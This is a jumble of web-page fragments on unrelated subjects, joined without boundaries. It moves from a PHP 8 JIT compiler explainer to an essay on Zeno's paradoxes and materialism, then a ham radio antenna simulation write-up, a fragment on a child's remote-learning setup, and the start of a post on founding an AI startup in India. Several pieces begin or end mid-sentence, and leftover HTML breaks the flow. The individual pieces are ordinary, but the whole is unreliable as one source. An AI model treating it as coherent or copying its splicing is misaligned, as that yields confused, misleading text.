you do fractals for a living 🤷🏻‍♀️).</p>
<p>So before you get too hyped or too disappointed about JIT, let me explain what
this thing is and how you can get the most out of it.</p>
<h2>What is a Just In Time compiled language and why do we need it?</h2>
<p>Let me introduce you to compilation first, I believe we will need it.</p>
<p>CPUs can't read english, you already know that. They can kind of read a series
of bits and bytes which represent addresses, values, instructions... But guess
who can't code this? That's right, us! (At least I can't 👀 (I kind of can, but... no.))</p>
<p>A solution to this problem is to translate something we, humans, can write into
something CPUs can execute. This translation can be called "compilation". So
<strong>compilation is a translation of human-readable code to machine code.</strong>
Simple, oder?</p>
<p>Translating human-readable code to machine code can happen in three different
ways: Ahead Of Time (AOT) compilation, Just In Time (JIT) compilation or, our
favorite, interpretation (or Implicit Compilation).</p>
<p><strong>Languages like C, C++ or Rust are AOT-compiled languages.</strong> You write the code,
you compile it and the output is a binary object that a CPU immediately understands
how to execute. It is called Ahead Of Time because you compile the binary object
BEFORE you run it.</p>
<p><strong>Languages like PHP, Java or JavaScript are interpreted.</strong> A code written in such
languages will be translated into an intermediate representation and another
program (a compiled one) will understand and execute such intermediate
representation. It is very common to call such programs "Virtual Machines" or
"Interpreters".</p>
<p><strong>Normally interpreted languages have less performance and freedom when compared
with AOT-compiled languages</strong> because things like memory management, CPU-targeted
instructions and funky low-level tricks are not available to the user space. So
another program (the interpreter) has to manage all of this plus be polyglot
enough to talk to different kinds of processors and operating systems.</p>
<p><strong>Languages like Java, LUA and now PHP are not only interpreted but also Just
In Time compiled!</strong> They still need a VM, but their VMs are capable of compiling
this intermediate representation of code into binary objects in runtime. These
JIT-capable VMs operate in a hybrid mode where code is partially compiled and interpreted.</p>
<p>When JIT kicks in, parts of your php code will be compiled into machine code so the
Zend VM (php's virtual machine) won't interpret these parts anymore. Your php
code will talk directly to the CPU.</p>
<p>So why can't we just compile everything, then? If the VM is a bottleneck, why
bother to run through it in the first place? We could just compile our php code
into machine code and be happy about it.</p>
<p>Well, we'd have to compile to specific CPU architectures, be prepared to talk to
different operating systems, be extremely clear about our variable types and
perform way more bare-metal operations than we should if we want to be productive.
There are decent abstractions for Golang and Rust, for example, but they aren't
very practical and require control over the environment they're deployed against.</p>
<p><strong>Interpreted languages, on the other hand, can be easily deployed to different
servers, allow rapid development and create room for dynamic typing systems.</strong></p>
<p>Just In Time compilation is potentially the best of the two worlds, combining
good speed and developer experience.</p>
<p>Dynamic typing, as you know, is one of the core features of PHP. It is very
complex and is tattooed into php's core in a way that removing the dynamic
typing is almost unthinkable.
<a href="https://thephp.website/en/issue/php-type-system/">Here’s a great summary on how php’s type system works.</a></p>
<p>And because of Dynamic Typing (and some other things you'll learn about below)
the Just In Time compiler present in PHP is not yielding big performance gains.
At least not yet.</p>
<p>Curious why? Keep reading!</p>
<h2>Let's see how PHP works with and without JIT</h2>
<p>In PHP there are three steps before executing your code: <strong>tokenizing</strong>,
<strong>parsing</strong> into an AST and <strong>compiling</strong> to an intermediate representation
known as <strong>Opcode</strong>.</p>
<p><strong>Tokenizing (or Lexing) is the process of reading php code and splitting
it into understandable units called tokens.</strong> <code>&lt;?php</code> becomes a _T_OPEN<em>TAG</em>,
<code>echo</code> becomes a _T<em>ECHO</em> and <code>"Hello, friend"</code> becomes T_CONSTANT_ENCAPSED_STRING.
<a href="https://www.php.net/manual/en/tokens.php">A complete list of PHP's tokens can be found here.</a></p>
<p>Parsing is the process of making sense out of such tokens. In PHP parsed tokens
are organized in a tree structure named AST (Abstract syntax tree).
The AST's job is to represent what operations should be. In <code>echo 1+1</code> the interpreter
should in fact understand <code>print the result of the expression 1+1</code>. Such tree would
look something like the following:</p>
<pre><code>operation =&gt; ECHO,
operand =&gt; expression (
    operation =&gt; ADD,
    operand1 =&gt; 1,
    operand2 =&gt; 1
)</code></pre>
<p>PHP is then able to <strong>compile this tree into an intermediate representation
called Opcode.</strong></p>
<p>The Opcode is what is actually executed by the virtual machine, so executing
is the final step. Here's a diagram illustrating how this process looks like.</p>

</a>
<figcaption>A simplified overview on PHP's interpreting flow.</figcaption>
</figure>
<p>You probably realized that tokenizing, parsing and compiling code every single time
can be a big bottleneck. PHP engineers thought so too and that's why the
Opcache extension exists. Let's have a quick look at it.</p>
<h2>The Opcache extension</h2>
<p>The Opcache extension is shipped with PHP and generally there's no big reason to
deactivate it. If you use PHP, you should probably have Opcache switched on.</p>
<p>It adds an in-memory shared cache layer to store Opcodes. So tokenizing, parsing
and compiling will happen once for each file and will be shared with every request.</p>
<p>With Opcache extension enabled, the execution of PHP code looks like in the following
diagram:</p>
<figure>
<a href="https://thephp.website/assets/images/posts/10-php-8-jit/zendvm-opcache.png" target="_blank">
<img src="https://thephp.website/assets/images/posts/10-php-8-jit/zendvm-opcache.png" alt="The PHP's interpreting flow with Opcache">
</a>
<figcaption>The PHP's interpreting flow with Opcache. If a file was already parsed, php fetches the cached Opcodes for it instead of parsing all over again.</figcaption>
</figure>
<p><strong>Side note:</strong> this is where <a href="https://wiki.php.net/rfc/preload">PHP 7.4's preloading feature</a>
shines! It allows you to tell PHP FPM to parse your codebase, transform it into
Opcodes and cache them even before you execute anything.</p>
<h2>Enters the Just In Time compilation</h2>
<p>While the Opcache extension will prevent PHP from tokenizing, parsing and compiling
over and over again, the Just In Time compilation aims to skip the virtual machine's
Opcode interpretation and let it execute machine code directly.</p>
<p>PHP's JIT implementation uses a C library called
<a href="https://luajit.org/dynasm.html">DynASM (Dynamic Assembler)</a>
which maps a set of CPU instructions in one specific format into assembly code for
many different CPU types. So the Just In Time compiler transforms Opcodes into an
architecture-specific machine code using DynASM.</p>
<p>The compilation happens between fetching Opcodes from cache and executing them.
Since compiling Opcode into machine code can be very expensive, PHP has to decide
which portions of your code might make sense to be compiled or not.</p>
<p><strong>PHP then profiles Opcodes being executed by the Zend VM and checks which ones
might make sense to compile. (based on your configuration)</strong></p>
<p>When an Opcode is compiled its execution doesn't happen through the Zend VM handlers,
they are directly executed by the CPU.</p>
<figure>

</a>
<figcaption>The PHP's interpreting flow with JIT. If compiled, Opcodes don't execute through the Zend VM.</figcaption>
</figure>
<p>When an Opcode should be compiled is decided based on your INI configurations. You'll
get more details in the next section.</p>
<h2>JIT Configuration</h2>
<p>Configuring JIT in PHP is very simple, there are two INI directives we need to set:
<code>opcache.jit_buffer_size</code> and <code>opcache.jit</code>. The first indicates how much memory
we're willing to allocate for compiled code, while the later one dictates how JIT
should behave.</p>
<p>There's also an optional directive named <code>opcache.jit_debug</code> for debugging purposes.
I will not cover this one here.</p>
<p>For example, the snippet below indicates that we're willing to give up to 100 Megabytes
of compiled code, enabling AVX instruction generation, using a global linear-scan register
allocator, profiling each request and jitting hot functions, optimizing the compiled
code based on static type inference. (👀 WUT?)</p>
<pre><code>opcache.jit_buffer_size=100M
opcache.jit=1235</code></pre>
<p>To make your life easier, I’m bringing some presets that
<a href="https://beberlei.de/2020/07/05/what_to_look_out_for_when_testing_php_jit.html">Benjamin Eberlei kindly shared in his blog</a>:</p>
<ul>
<li><code>opcache.jit=1205</code> (JIT everything)</li>
<li><code>opcache.jit=1235</code> (JIT hot code based on relative usage)</li>
<li><code>opcache.jit=1255</code> (trace hot code for JITability, the best so far)</li>
</ul>
<p>The <code>opcache.jit</code> entry is a sequence of values named "CRTO", each character can have different
behavioural effect on your application. Below I explain what each of these letters can do:</p>
<p><strong>C - CPU-specific optimization</strong></p>

The opinions expressed in it are those of its author.)</p>

<p><a href="https://1.bp.blogspot.com/-Wrim0IZG378/X0qLCMaZclI/AAAAAAAAG5s/4Neb2b2IfPU1Ln0JINzTib97Wb-9qLzRQCLcBGAsYHQ/s1600/Grandville_tortoise.jpg" imageanchor="1"><img data-original-height="695" data-original-width="695" height="400" src="https://1.bp.blogspot.com/-Wrim0IZG378/X0qLCMaZclI/AAAAAAAAG5s/4Neb2b2IfPU1Ln0JINzTib97Wb-9qLzRQCLcBGAsYHQ/s400/Grandville_tortoise.jpg" width="400"></a></p>

<p>
One of the paradoxes of the pre-Socratic philosopher Zeno, involves a race between a hare and a tortoise. Here is a different version of that paradox:  I challenge world-record-holder Usain Bolt to a 100 metre race. My only condition is that he gives me a 10 metre start. He accepts. I’ll now explain why he cannot possibly beat me.</p>

<p>
The race begins. To overtake me, Bolt must first reach my starting point at the 10 metre mark. This will take him some time, let’s say roughly one second. In that second I will have moved forward from the 10 metre mark, let’s say 5 metres.&nbsp;</p>

<p>
So now, after one second of the race has passed, Bolt is at the 10 metre point and must reach my new position at the 15 metre point. This will take him about a half of one second, but in that time I will have moved forward again a short distance.</p>

<p>
There is no end to this process; however quickly Bolt catches up to where I was, I will have used that time, however short, to move ahead, albeit by a shorter distance each time. However small the time and distances get, Bolt can never catch me, I will always be ahead.</p>

<p>
So the paradox is that it is impossible for Bolt to overtake me in a 100 metre race. Because we know that this isn’t true, the paradox is telling us something is wrong in the process that got us to that conclusion.&nbsp;</p>

<p>
What goes wrong with the hare and the tortoise paradox is that the endless series of points that, in my example, Bolt would have to pass through, are not actual points. They are abstractions. The points aren’t there, marked in the ground, they are part of a theory. Bolt does not have to run past an infinite number of actual things, just an infinite number of ideas, an infinite number of abstractions.</p>

<p>
It doesn’t seem so impossible now, does it, to run past an abstract idea of endless points. And better still, as each abstract point is a dimensionless point with no length, even if they did exist, how long does it take to run past something that has no length? However many points of zero length you have, zeros don’t add up to anything.</p>

<p>
Another paradox of Zeno states arrows cannot fly. The argument here is that at any particular moment of the flight, the arrow is not moving; at any instant of time, the arrow will be stationary at that particular point. Imagine taking a video of the flight of the arrow and then looking at every frame of the video: in each and every frame the arrow is not moving.</p>

<p>
Again, we know arrows do fly through the air, so this paradox must be telling us there is something wrong with the thought process, not with the flying arrow.</p>

<p>
Zeno has made the same mistake here with time as he made with distance with the hare and the tortoise; he has assumed that the actual is made up of the abstract, that time is made up of frozen instants. In the same way as an infinitesimal point on a line has no length and so the line cannot be made up of points, a frozen instant in time has no duration and so a period of time (the flight of the arrow) cannot be made up of duration-less instants.</p>

<p>
(Zeno’s paradoxes have also been solved by mathematics using sums of infinite series tending to a limit. Infinite series as described by Zeno can in fact be calculated within a finite limit, so there is a point that can be calculated when Bolt will overtake me. Assuming time and space are discrete—that they have a shortest non-zero length—is also a way of solving the paradoxes. There are no instants of time; there is a smallest duration of time and the arrow will be moving within that.)</p>


<p><span>The materialists are making the same type of error as with the Zeno paradoxes of time and distance; they are assuming that an experience we know does happen, is made up of abstractions we can use to describe that experience.</span></p>


<p>
Let us now turn our attention away from distance and time, away from hares and arrows, and look at consciousness. I will attempt to formulate a new Zeno-type paradox for consciousness and see what light that sheds on the hard problem of consciousness.</p>

<p>
Before formulating this new paradox, we need to briefly explore what the hard problem of consciousness is, and to do that we need to look at the metaphysical philosophy of materialism. Simply stated, this asserts that everything is made of matter, of physical stuff. You may wonder why such a seemingly obvious and self-explanatory statement requires the title of a metaphysical philosophy. The reason is that materialism isn’t just saying that there are physical things, it is saying everything is physical. Materialism is saying that the thoughts you are having now are physical; it is saying that the curious and unique mix of emotions you are subjectively experiencing at this very moment are purely and solely physical material things. And it is saying that the awareness that witnesses all these subjective feelings is physical. This no longer seems so obvious, does it?</p>

<p>
Not only does it perhaps seem a little strange to assume that all our mental, emotional and spiritual experiences, and the subjective experiencer, are actually objective, external and physical, <i>materialists have absolutely no idea, even in principle, how matter could possibly create our rich inner life of conscious awareness and experience. </i>This is what is referred to as the hard problem of consciousness.</p>

<p>
This is why materialism is a metaphysical philosophy. It is a theory with an assumption that attempts to account for all things. It has not done well at all when it comes to accounting for your continuous and immediate experience of everything. There are other theories that, arguably, do a better job of this. We will look at one later.</p>

<p>
But what of science? Isn’t the indisputable and phenomenal success of science and technology proof that materialism is an extremely successful theory? No. Science is agnostic on metaphysical philosophy. The scientific method and all the advances and technological breakthroughs that follow, work perfectly well regardless of your philosophical beliefs. That is, in fact, its strength: it relies on empirical data, not belief.&nbsp;</p>

<p>
The connection between the scientific method and the philosophy of materialism is no more than the fact that most scientists tend to also be materialists. That’s it. There are scientists who are not materialists; their science is no less valid. The success of science comes from following the scientific method, not from the philosophical beliefs of the scientist.</p>

<p>
Materialism then, posits that consciousness—if it is anything at all—must be physical; it must be so because everything is. All your subjective experiences are simply properties of material arrangements, just like the other physical properties of mass, charge, spin etc.</p>

<p>
Any subjective conscious experience, according to the materialist, must, therefore, be describable in purely measurable and physical terms.  Just as we can describe the mass and charge of particles in numbers and their interactions with equations, the materialist must account for all conscious experiences in the same way; a materialist must treat consciousness the same as matter because, for them, it <i>is</i> matter; because everything is matter.</p>


<p><span>To be a materialist, you have a difficult choice to make: choose the fundamentalist path of denying undeniable reality; or take on the burden of Sisyphus, endlessly rolling the rock of matter towards consciousness, doomed for it to forever roll back to the beginning of your false assumption.</span></p>


<p>
Scientists find many correlations between conscious experience and brain states, and brain states can be described mathematically. This seems promising for the materialist project. Because neuroscientists are mostly philosophical materialists, they tend to assume that this correlation is evidence of causation; that is, that each and every conscious experience is reducible to a specific brain state. This would mean they could describe consciousness with numbers and equations, as your conscious experiences would be nothing more than physical properties of precise neural arrangements in your brain.</p>

<p>
But remember the hard problem. No scientist, and no materialist, has a clue how that could be possible. There is simply no testable hypothesis as to how subjective conscious experiences arise as properties of neurons in your brain. <i>The correlations are science, but the idea that brains cause consciousness, that remains firmly metaphysical.</i></p>

<p>
The metaphysical theory that everything is matter is a philosophy, not a scientific fact. But we can go further and say that even the assumption that there is any matter at all, is equally a theory and a philosophical assumption, not a scientific fact. The idea that there is physical matter outside of our conscious experience is just that, an idea. We only know for sure that we have subjective experience; we cannot know for sure what constitutes that experience. The only thing we know for sure is our immediate experience of being subjectively aware. Everything we can ever possibly know can only be known by us within and via the medium of our subjective experience.</p>

<p>
The scientific method successfully explores the behaviour of the contents of our subjective experience and gives us technology as a result, but the scientific method hasn’t discovered the essence or the true nature of the contents of our conscious experience. It can describe and predict and mimic what happens; it doesn’t tell us what it is.</p>

<p>
The most successful theory of physics, by far, is quantum field theory. It states that what we think of as matter is best understood and predicted by an equation of probabilities. Some recent experiments in quantum mechanics lead Bernardo Kastrup and others to the conclusion that the idea of there being an objective and …</p></div></div>

<p>
Has anyone else ever thought about why so many engineers are also
active amateur radio operators? My theory is that there's just so much
passion for the science and practical use of these complex electronic
systems! We enjoy the problems, challenges and solutions so much that
we want to find other ways outside of work to find those same
experiences. In this case, I've got a story that starts with some
amateur radio equipment but comes full-circle to address an extremely
common design issue.
</p>
<h2 id="headline-1">
The Attempted QSO
</h2>
<p>
This all begins with a new radio. I recently installed the
FTM-3200DR<sup><a id="footnote-reference-1" href="#footnote-1">1</a></sup>, a 2m-band, 65W transceiver with Yaesu's digital C4FM
modulation. One of the first things I wanted to try with this radio
was a direct, simplex QSO<sup><a id="footnote-reference-2" href="#footnote-2">2</a></sup> with a friend who is about 16 miles
away as the crow flies. Unfortunately for propagation, we've got a
decent amount of hilly terrain up here in the Skylands region of New
Jersey in addition to this being the summer season with significant
foliage.<sup><a id="footnote-reference-3" href="#footnote-3">3</a></sup>
</p>
<p>
After setting up the radio, I had one more crucial component before we
could attempt the exchange… the antenna! I considered making one
from scratch, but eventually settled on the Arrow OSJ (open-stub
J-pole)<sup><a id="footnote-reference-4" href="#footnote-4">4</a></sup>. This antenna had excellent ratings and reviews for a
low cost. It's also sold as a dual band (2m and 70cm) if I ever
decided to take advantage of that capability. Originally, my plan was
to install the antenna in the attic (after performing all safety
calculations)<sup><a id="footnote-reference-5" href="#footnote-5">5</a></sup>. After thinking about it though, I noticed the old
satellite dish mounted on the roof which hadn't been touched since we
moved in and decided on that location instead. 
</p>
<p>
One motivation in selecting this antenna was its omni-directional
propagation<sup><a id="footnote-reference-6" href="#footnote-6">6</a></sup>. Despite the idea of using this radio to communicate
with one friend, I still held high high the importance of an
omni-directional station. As I was installing the OSJ antenna, I
realized that it's not a perfectly symmetrical design - should I
orient the driven element in the direction of desired propagation, or
the opposite? I decided that it was time for an electromagnetic
analysis! Of course, I had these thoughts while on the roof, and
mounted the antenna with my best guess.
</p>

</figure>


<h2 id="headline-2">
Open-Stub J-Pole Analysis
</h2>
<p>
Once down from the roof, I began my analysis. There are some free
simulators out there that use the NEC<sup><a id="footnote-reference-7" href="#footnote-7">7</a></sup> on one end of the
(electromagnetic?)  spectrum. At the other end are the
enterprise-level RF design tools such as Microwave Office<sup><a id="footnote-reference-8" href="#footnote-8">8</a></sup>,
ADS<sup><a id="footnote-reference-9" href="#footnote-9">9</a></sup>, and Ansys<sup><a id="footnote-reference-10" href="#footnote-10">10</a></sup>. Did you know that it doesn't take a full
RF design software license to get a good idea of antenna performance?
Even just an SI/PI analysis suite such as Cadence Sigrity can get us
what we need. The Sigrity 3DEM license along with 3D Workbench<sup><a id="footnote-reference-11" href="#footnote-11">11</a></sup>
provides a perfect environment to quickly model arbitrary 3-D geometry
and determine parameters such as resonant frequency, VSWR/S11, and
far-field radiation patterns. It may not automatically give detailed
results such as efficiency or directivity but it's plenty to give an
idea of behavior and allows the designer an opportunity to modify a
design to meet any project requirements. 
</p>

            <p><em>Figure 3. OSJ model, UHF connector detail.</em></p>
        </figcaption>
</figure>


<p>
The antenna was simulated as if mounted to a 100" insulated pole. The
range of 100 MHz to 500 MHz was selected in order to ascertain
behavior in both the 2m and 70cm bands. The UHF connector<sup><a id="footnote-reference-12" href="#footnote-12">12</a></sup> was
originally modeled, but I realized that I didn't have accurate
dimensions of the SO-239 stud or coupling nut, and I wouldn't want to
introduce reflections which are not representative of the antenna
structure itself.
</p>
<h3 id="headline-3">
Results
</h3>
<p>
The results confirmed exactly what some reviews have stated:
performance is slightly worse in the 70cm band. S11 (converted to
VSWR) does indicate this, with a best-case SWR of 1.2 in the 70cm
band, and 1.1 in the 2m band.
</p>

            <p><em>Figure 5. OSJ VSWR.</em></p>
        </figcaption>
</figure>


<p>
One of the most interesting things about this analysis is that the
center frequency for both bands is quite a bit different from what is
reported. The Arrow SWR chart<sup><a id="footnote-reference-13" href="#footnote-13">13</a></sup> shows the 2m band coverage from
142-150 MHz and the 70cm from 430-453 MHz. Our analysis shows the 2m
band covering 136-142 MHz and the 70cm band covering 404-414 MHz -
both lower than expected. This should be confirmed with an antenna
analyzer, though one is not currently available to make the
measurement. Interesting to note - I'm not the first person to notice
these discrepancies when simulating against the instruction manual's
dimensions<sup><a id="footnote-reference-14" href="#footnote-14">14</a></sup>. I did make a point to measure the antenna and each
element was within 1/4" of the stated dimensions. That made me even
more eager to get an analyzer on it to test its actual response. At
that point, I tweaked the model to match measurements and ensure the
feed point is modeled correctly. For now though - the goal is simply
to determine propagation directionality which I'll analyze in the next
section.
</p>
<h4 id="headline-4">
Far Field Propagation
</h4>
<p>
Finally, we arrive at my ultimate goal - determining whether or not
propagation is truly omni-directional! The fastest way to check this
out is to look at the far field propagation plots. For reference,
Fig. 6 shows the orientation of the antenna in relation to the
axes. We are specifically looking for any directivity at all in the
antenna. All plots will indicate the frequency of interest, and every
plot was generated with a 1V source (13 dBm) and field strength is
simulated at a distance of 3m.
</p>
<figure>

            <p><em>Figure 6. Antenna orientation.</em></p>
        </figcaption>
</figure>


<p>
First, I'll present an isometric view of the propagation pattern. It's
important to note that the units are given in mV/m for the 3D plots,
but dBuV/m for the 2D plots to follow. This makes the magnitude of
variation seem greater in the 3D plots, but we can probe for specific
values on the 2D plots. (Click any of the propagation plots for a
larger view).
</p>
<figure><a href="https://shielddigitaldesign.com/images/post/2020/ff_139m_iso.png">
    <img src="https://shielddigitaldesign.com/images/post/2020/ff_139m_iso.png" alt="Figure 7. Far field, 139 MHz, isometric view." width="400"> </a><figcaption>
            <p><em>Figure 7. Far field, 139 MHz, isometric view.</em></p>
        </figcaption>
</figure>


<p>
The isometric view is the first indication that we aren't looking at
purely omni-directional propagation. As fun as the 3D views are to
look at, we can get the specific difference with a 2D plot.
</p>
<figure><a href="https://shielddigitaldesign.com/images/post/2020/ff2d_139m_z.png">
    <img src="https://shielddigitaldesign.com/images/post/2020/ff2d_139m_z.png" alt="Figure 7. Far field, 139 MHz, top-down cut on the XY-plane (Z=0)." width="400"> </a><figcaption>
            <p><em>Figure 7. Far field, 139 MHz, top-down cut on the XY-plane (Z=0).</em></p>
        </figcaption>
</figure>


<p>
As it turns out, there is a minor difference in propagation depending
on the angle ɸ. The maximum value at ɸ=180° is 114.4 dBuV/m,
and the minimum value at ɸ=0° is 112.4 dBuV/m. It would be nice
to represent this as a dBi difference. Using an online
calculator<sup><a id="footnote-reference-15" href="#footnote-15">15</a></sup> (they're always right of course!) we can determine
the gain of the antenna in dBi. In this case, we see a gain of 6.2 dBi
in the forward direction and 4.2 dBi in the backward direction for a 2
dB front-to-back ratio. Coincidentally, this was my guess while on the
roof and was the orientation I used while mounting the antenna. This
may not be extremely significant but it's worth knowing while mounting
the antenna.
</p>
<p>
Surprisingly, there's even more directivity at 70cm, although that
won't matter for me and my 2m-only radio. 
</p>
<figure><a href="https://shielddigitaldesign.com/images/post/2020/ff_410m_z.png">
    <img src="https://shielddigitaldesign.com/images/post/2020/ff_410m_z.png" alt="Figure 8. Far field, 410 MHz, top-down view." width="400"> </a><figcaption>
            <p><em>Figure 8. Far field, 410 MHz, top-down view.</em></p>
        </figcaption>
</figure>


<p>
The bottom-line answer to my original question is that if you really
need to squeak out every last bit of gain in a certain direction, then
you'd be better off mounting the J-pole with the driven element closer
to that desired direction.
</p>
<p>
One last thing - if anyone is looking at more simulations or
measurements, here's the Touchstone<sup><a id="footnote-reference-16" href="#footnote-16">16</a></sup> file for this simulation which can
be downloaded and compared. Let me know if you use it!

<h4 id="headline-5">
What about that QSO?
</h4>
<p>
As of publication my friend and I have yet to close the link on a
successful exchange. This could be due to any number of factors, but I
was able to make contact with another ham via a repeater located 30
miles from my QTH<sup><a id="footnote-reference-2" href="#footnote-2">2</a></sup>, so the reasonable assumption is that the antenna
system on my roof is operating well.
</p>
<h2 id="headline-6">
PCB antenna
</h2>
<p>
While analysis of ham radio antennas is an interesting pursuit, it
caused me to stop and consider more practical applications of this
software. One thing that really struck me was the huge rise in IoT
devices using Bluetooth, Wi-Fi, NFC, and many other wireless
communication protocols. How can a designer be assured their antenna
will work as required? Sure, copying dimensions from datasheets or
other resources might be adequate but for optimal performance on the
first fab run, a simulation would be very helpful. As an example, I've
chosen a common antenna design and show how quick and easy it is to simulate
and validate prior to fabrication.
</p>
<h3 id="headline-7">
Antenna Selection
</h3>
<p>
Cypress has an excellent document<sup><a id="footnote-reference-17" href="#footnote-17">17</a></sup> describing antenna and RF
design. Even better, they have links to PCB designs of a few antennas
which can be adapted to a designer's board. I chose to import and
simulate their MIFA (Meandered Inverted-F Antenna).
</p>
<figure>
    <img src="https://shielddigitaldesign.com/images/post/2020/mifa_3d.png" alt="Figure 9. MIFA 3D view." width="400"> <figcaption>
            <p><em>Figure 9. MIFA 3D view.</em></p>
        </figcaption>
</figure>


<p>
Prior to beginning the simulation we must determine the PCB stackup
and materials used. Fortunately the linked design files include a
fabrication drawing which indicates a finished PCB thickness of
62mils. The material is listed as generic FR-4, so we'll use one of
the most common FR-4 materials available: Isola 370HR<sup><a id="footnote-reference-18" href="#footnote-18">18</a></sup>. 
</p>
<p>
Next, the board design must be imported into the simulation tool of
choice. In this case, I'll bring the .brd file into PowerSI 3D-EM in
order to tweak the stackup. From there, we'll save it as a .spd and
bring that into 3D Workbench.
</p>

<h3 id="headline-8">
Initial Simulation
</h3>
<p>
The first simulation shows that this board must have been designed
specifically for manual adjustment given the resonant frequency is 2.1
GHz (see Fig. 11 below). …</p></div></div>

We recommend not putting your child at a desk, but on the floor for maximum comfort and freedom of movement. As adults, we learn to sit at desks, but perching or sitting is <a href="https://www.fastcompany.com/90480052/how-to-perfect-your-home-work-set-up-so-your-back-stops-hurting-so-much">much better for our bodies</a>. Position the lens of the camera of your child’s computer, chromebook or tablet so your child can be seen standing up or lying down on the circular mat. You can gently encourage your child to stay in the circle, but it’s fine for them to move off it if you get a wide lens. They can reference it as a center point. A great use case for the circular yoga mat as a focal point is the popular kids youtube channel, Cosmic Kids Yoga.</p></li><li><p><a href="https://www.amazon.com/dp/B07N9L5FJJ/ref=sspa_dk_detail_1?psc=1&amp;pd_rd_i=B07N9L5FJJ&amp;pd_rd_w=TNNmU&amp;pf_rd_p=f0355a48-7e73-489a-9590-564e12837b93&amp;pd_rd_wg=AV85z&amp;pf_rd_r=0FA92JRGBPSGTD7QST5M&amp;pd_rd_r=9338d1bb-34e8-405b-8210-d040fe5d3ae5&amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUEzS0VBR0k4UDJKU1haJmVuY3J5cHRlZElkPUEwODI2MDk2MlNSMzA1QjRZSVpINiZlbmNyeXB0ZWRBZElkPUEwNjI4MDc0MUhEUzU1VDdTMFVQUyZ3aWRnZXROYW1lPXNwX2RldGFpbF90aGVtYXRpYyZhY3Rpb249Y2xpY2tSZWRpcmVjdCZkb05vdExvZ0NsaWNrPXRydWU="><strong>A lapdesk tray</strong></a> for writing and drawing.

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In this post, I am going to document some trends, tricks and patterns I have derived from the Zero to One phase of my startup. I will try to broadly describe to you lessons I distilled while getting an Enterprise AI startup from nothing to its first revenues. First revenues are not success, they are necessary but not sufficient for success, so don’t confuse this with recipe for a Unicorn say. If and when we make it big, another post on “How to create a successful AI startup” will come up :) .</p>

<p>Also, please note that all premise here is quite egocentric, that is, it doesn’t take into account any discussions with other startup founders or many players in startup ecosystem. So, some of them might not apply to others at all. This is just me (not even my cofounders) trying to organize my thoughts around our journey, goes without saying this is my personal perspective and not an official stand of the startup I founded and work at. Also history doesn’t repeat itself, so assumptions which were true for me might not be true for you, so please a feel try to intuit the assumptions when you are reading. Another important point you should remember is that this article contains “one possible set of tricks”, not “THE set of tricks”. Its better to know one set of tricks than knowing none, but please know there can be a very different, even contrary path for a startup to reach from zero to one. All disclaimers done, hope my musings can help you in anyway!</p>



<p>Audience of this post is me 5-6 years back when I was thinking of starting a business. So, basically a person with following characteristics should it most helpful:</p>

<p>1. Technology person, who has decided to start their own business seeing an upcoming (or existing) startup trend/ecosystem in their country. Attracted to it because they might have heard of people earning a lot or building cool tech.</p>

<p>2. Doesn’t know much about business except “Let’s build some cool tech that will sell itself”.</p>

<p>3. Outsider to the startup world. (That is you don’t know people who have done startups closely so as to take lessons from their life).</p>

<p>4. India based. Indians are quite different from the rest of the world culturally and there are things Indians observe/miss that others don’t.</p>

<p>5. You are not a super-exceptional team, that is not already famous before you started your company.</p>

<p>I will link definitions of startup linked terms in case you are such a beginner as described and aren’t aware of a few such terms. I did not know many startup-y terms when I started my company, I dont understand a few even yet maybe.</p>

<p>Now, even if you are more evolved/different than this startup-wise, you might still appreciate some points of the post, but you will find that other portions state the obvious. That is power of hindsight.</p>



<p>Let’s start with the basics first. Why did you get into a startup ? What are you really required to do when you are running a startup ? While for repeat entrepreneurs and people who come from a professional/social network of entrepreneurs would be very clear about this, an outsider is not. A 2014 version of me would probably not be very clear about some things here. If you read lot of startup literature, this might be a boring section for you as most stuff here is talked about a lot.</p>

<h2 id="why-start-up-">Why start up ?</h2>

<p>I did a startup because I wanted to work on tech that I found cool and also I wanted to be my own boss. That was the aim at least in the start. I think startup is an actually good place to get into if you have same aims as me. But as cliched as it may sound “with great power comes great responsibility”. Unlike in a day to day job, in startup you are taking up a lot of risk too. I cannot understate it here, if you dont make something good out of yourself in your startup, you will actually suffer loss and so will your near and dear ones and your early employees who trust you with their future. It takes sometime after you are in a startup to realize whether you were investing time and resources correctly or not. While there is a relived content type of feeling after seeing you have done relatively better for your people and your early employees, it also will be quite anxious a feeling otherwise. I will repeat it again, in early days of a startup, rewards are so sparse it is easy to confuse between a time period between rewards and pure inaction leading nowhere. You need to stay focused and stick to fundamentals during such confusing times, otherwise you might find that you have wasted time quite late. People generally try to understate the risk, getting secluded from social life, psychological hardships and stress, financial troubles and opportunity cost of people trying to enter the startup world as total noobs so that they don’t get discouraged. I don’t think you should think of the risk you are taking as soft, it exists and you need to be aware of it so that you don’t lose sight of your goal and lax out. It will be quite easy to lax out on the startup journey and you need to hammer it deep in your head that you cannot afford such a thing. That said, the upsides are great. I can ascertain that total absolute freedom to work in your style, taking decisions that actually change outcomes along the way and seeing your concepts change the world is a feeling that all the risk is worth it for. This feeling of achievement cannot be overstated. I assume when the financial gains reach you, it would be great too. (I’m not really rich yet so cannot comment how does that feel).</p>

<p>There are privileged people who do startups too. They can maintain good social life, life relatively comfortably even while doing a startup and will be shown in media as cool startup people. Don’t buy into the hype. Privileged people have more risk appetite and they can afford more failures and they can thus have many trials and need to get successful just at one. Probably that’s where the privileged founder narrative in the media comes from, more risk appetite is associated with better success, just due to the sheer number of trials and learning. For a lower middle class/middle class person (sp. If you are Indian), one failed startup is probably the maximum number of attempts they will get in this space, they need to make it count. Remember: “Make it count”. If you have a gut feeling not enough is happening, you are probably right, take charge and push and “Make it count”.</p>

<p>I think this section was more emotional than I intended to. Let’s try to come to more important business henceforth.</p>

<h2 id="what-is-a-startup-">What is a startup ?</h2>

<p>What is a AI startup ? If you are building an AI startup, you need to :</p>

<p>* Build a fast growing product business.</p>

